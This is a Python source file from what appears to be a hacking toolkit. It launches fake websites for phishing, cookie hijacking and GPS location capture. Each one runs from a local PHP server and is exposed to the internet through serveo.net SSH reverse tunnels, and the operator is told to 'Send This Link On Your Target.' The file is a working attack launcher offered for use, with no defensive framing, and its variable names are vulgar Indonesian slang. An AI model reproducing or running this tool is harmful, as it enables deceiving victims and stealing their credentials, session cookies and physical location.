#-*-coding:utf-8-*-
# Coded By Deray
'''
	 Rebuild Copyright Can't make u real programmer
'''
# Report Bug On My Other Sosmed
# instagram: @reyy05_
# facebook: https://facebook.com/achmad.luthfi.hadi.3

import os
import sys
import time
import requests
from data import server
from data.color import *
from data import cache
import subprocess as kontol

cache.cleanCache()

class cek_required:
	def __init__(self):
		with open("data/log.txt","w") as s:
			try:
				kontol.Popen(["which","ssh"],
				stderr=s,stdin=s,stdout=s)
				time.sleep(1)
				kontol.Popen(["which","php"],
				stderr=s,stdin=s,stdout=s)
				time.sleep(1)
			except:pass
			while True:
				o=open("data/log.txt").read()
				if "/ssh" in o:
					pass
				else:
					sys.exit("%s[!]%s openssh not installed"%(R,N))
				if "/php" in o:
					break
				else:
					sys.exit("%s[!]%s php not installed."%(R,N))
					
					
class phising():
	def __init__(self):
		cek_required()
		self.ngentod()
	def ngentod(self):
		self.a=raw_input("[%s+%s] Site Name: "%(G,N))
		if (self.a == ""):
			return self.ngentod()
		print("[%s!%s] Please Wait Creating Fake Websites ..."%(G,N))
		self.generate()
		
	def generate(self):
		with open("data/log.txt","w") as memek:
			kontol.Popen(
						["php","-S","localhost:8080","-t",
						"raw/server/phising"],
						stderr=memek,
						stdin=memek,stdout=memek
			)
			time.sleep(3)
			print("[%s+%s] Open New Tab And Run %sasu.py%s select Server Listener"%(G,N,G,N))
			print("[%s+%s] Send This Link On Your Target ."%(G,N))
			print("[%s!%s] press '%syes%s' quickly if you find a question"%(G,N,G,N))
			print("[%s!%s] waiting server active ..."%(G,N))
			kontol.Popen([
					"ssh","-R",
					"{}.serveo.net:80:localhost:8080".format(
					self.a),
					"serveo.net"],stderr=memek,
				stdin=memek,stdout=memek
			)
			while True:
				r=requests.get("http://%s.serveo.net"%(self.a))
				if r.status_code == 200:
					time.sleep(5)
					self.bengong()
					break
					os.system("killall php;killall ssh")
	def bengong(self):
		while True:
			a=["|","/","-","\\"]
			for x in a:
				print "\r[{}+{}] Running Webserver: http://{}.serveo.net .. {}  ".format(G,N,self.a,
				x
				),;sys.stdout.flush();time.sleep(0.20)
							
class locator():
	def __init__(self):
		cek_required()
		self.ipLogger()
	def ipLogger(self):
		if os.path.exists("raw/server/cookieHighJacking/index.php"):
			print("[%s!%s] File index.php was found in %scookieHighJacking/index.php%s"%(R,N,R,N))
			r=raw_input("[%s?%s] Did u want to edit site? y/n: "%(G,N))
			if r.lower() == "y":
				self.a=raw_input("[%s+%s] Site Name  : "%(G,N))
				c=raw_input("[%s+%s] HTML Title : "%(G,N))
				b=raw_input("[%s+%s] Alert Msg  : "%(G,N))
				d=raw_input("[%s+%s] HTML Body  : "%(G,N))
				server.cookiejack(c,b,d)
				print("[%s+%s] Please Wait Creating Fake Websites .."%(G,N))
				with open("data/log.txt","w") as memek:
					kontol.Popen(
						["php","-S","localhost:8080","-t",
						"raw/server/cookieHighJacking"],
						stderr=memek,stdin=memek,stdout=memek
					)
					time.sleep(3)
					print("[%s+%s] Open New Tab And Run %sasu.py%s select Server Listener"%(G,N,G,N))
					print("[%s+%s] Send This Link On Your Target ."%(G,N))
					print("[%s!%s] press '%syes%s' quickly if you find a question"%(G,N,G,N))
					print("[%s!%s] waiting server active ..."%(G,N))
					kontol.Popen([
							"ssh","-R",
							"{}.serveo.net:80:localhost:8080".format(
								self.a),
							"serveo.net"
					],stderr=memek,stdin=memek,stdout=memek)
					while True:
						r=requests.get("http://%s.serveo.net"%(self.a))
						if r.status_code == 200:
							time.sleep(5)
							self.bengong()
							break
							os.system("killall php;killall ssh")
			else:
				self.a=raw_input("[%s+%s] Site Name  : "%(G,N))
				print("[%s+%s] Please Wait Creating Fake Websites .."%(G,N))
				with open("data/log.txt","w") as memek:
					kontol.Popen(
						["php","-S","localhost:8080","-t",
						"raw/server/cookieHighJacking"],
						stderr=memek,stdin=memek,stdout=memek
					)
					time.sleep(4)
					print("[%s+%s] Open New Tab And Run %sasu.py%s select Server Listener"%(G,N,G,N))
					print("[%s+%s] Send This Link On Your Target ."%(G,N))
					print("[%s!%s] press '%syes%s' quickly if you find a question"%(G,N,G,N))
					print("[%s!%s] waiting server active ..."%(G,N))
					kontol.Popen([
							"ssh","-R",
							"{}.serveo.net:80:localhost:8080".format(
								self.a),
							"serveo.net"
					],stderr=memek,stdin=memek,stdout=memek)
					time.sleep(5)
					while True:
						r=requests.get("http://%s.serveo.net"%(self.a))
						if r.status_code == 200:
							time.sleep(5)
							self.bengong()
							break
							os.system("killall php;killall ssh")
	def bengong(self):
		while True:
			a=["|","/","-","\\"]
			for x in a:
				print "\r[{}+{}] Running Webserver: http://{}.serveo.net .. {}  ".format(G,N,self.a,
				x
				),;sys.stdout.flush();time.sleep(0.20)
				
class gps():
	def __init__(self):
		cek_required()
		self.gps()
	def gps(self):
		if os.path.exists("raw/server/gps/index.php"):
			print("[%s+%s] File index.php was found in %s/gps/index.php%s"%(R,N,R,N))
			r=raw_input("[%s?%s] Did u want to edit site? y/n: "%(G,N))
			if r.lower() == "y":
				self.a=raw_input("[%s+%s] Site Name  : "%(G,N))
				c=raw_input("[%s+%s] HTML Title : "%(G,N))
				b=raw_input("[%s+%s] Alert Msg  : "%(G,N))
				d=raw_input("[%s+%s] HTML Body  : "%(G,N))
				server.gps(c,b,d)
				print("[%s+%s] Please Wait Creating Fake Websites .."%(G,N))
				with open("data/log.txt","w") as memek:
					kontol.Popen(
						["php","-S","localhost:8080","-t","raw/server/gps"],
						stderr=memek,stdin=memek,stdout=memek
					)
					time.sleep(3)
					print("[%s+%s] Open New Tab And Run %sasu.py%s select Server Listener"%(G,N,G,N))
					print("[%s+%s] Send This Link On Your Target ."%(G,N))
					print("[%s!%s] press '%syes%s' quickly if you find a question"%(G,N,G,N))
					print("[%s!%s] waiting server active ..."%(G,N))
					kontol.Popen([
								"ssh","-R",
								"{}.serveo.net:80:localhost:8080".format(
									self.a),
								"serveo.net"
					],stderr=memek,stdin=memek,stdout=memek)
					time.sleep(5)
					while True:
						r=requests.get("http://%s.serveo.net"%(self.a))
						if r.status_code == 200:
							time.sleep(5)
							self.bengong()
							break
							os.system("killall php;killall ssh")
			else:
				self.a=raw_input("[%s+%s] Site Name  : "%(G,N))
				print("[%s+%s] Please Wait Creating Fake Websites .."%(G,N))
				with open("data/log.txt","w") as memek:
					kontol.Popen(
						["php","-S","localhost:8080","-t","raw/server/gps/"],
						stderr=memek,stdin=memek,stdout=memek
					)
					time.sleep(4)
					print("[%s+%s] Open New Tab And Run %sasu.py%s select Server Listener"%(G,N,G,N))
					print("[%s+%s] Send This Link On Your Target ."%(G,N))
					print("[%s!%s] press '%syes%s' quickly if you find a question"%(G,N,G,N))
					print("[%s!%s] waiting server active ..."%(G,N))
					kontol.Popen([
								"ssh","-R",
								"{}.serveo.net:80:localhost:8080".format(
									self.a),
								"serveo.net"
					],stderr=memek,stdin=memek,stdout=memek)
					time.sleep(5)
					while True:
						r=requests.get("http://%s.serveo.net"%(self.a))
						if r.status_code == 200:
							time.sleep(5)
							self.bengong()
							break
							os.system("killall php;killall ssh")
	def bengong(self):
		while True:
			a=["|","/","-","\\"]
			for x in a:
				print "\r[{}+{}] Running Webserver: http://{}.serveo.net .. {}  ".format(G,N,self.a,
				x
				),;sys.stdout.flush();time.sleep(0.20)
